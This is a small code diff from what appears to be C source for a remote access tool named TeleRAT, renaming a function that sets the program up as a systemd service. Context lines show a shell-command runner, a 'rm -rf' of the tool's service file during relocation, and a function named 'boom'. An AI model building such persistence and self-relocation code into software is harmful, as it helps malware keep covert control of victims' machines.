@@ -30,7 +30,7 @@ void exeCMD(char *cmd){
     pclose(fp);
 }
 
-void serviceSetting(char *path,char *pName){
+void initSetiing(char *path,char *pName){
     struct cmd_struct cmd;
 
 	//Connect path with program	
@@ -72,7 +72,7 @@ void move(char *path, char *pName){
     exeCMD(cmd.cmd);
     exeCMD("rm -rf /etc/systemd/system/TeleRAT.service");
     bzero(cmd.cmd,sizeof(cmd.cmd));
-    serviceSetting("/",pName);
+    initSetiing("/",pName);
 }
 
 void boom(char *path,char *pName){
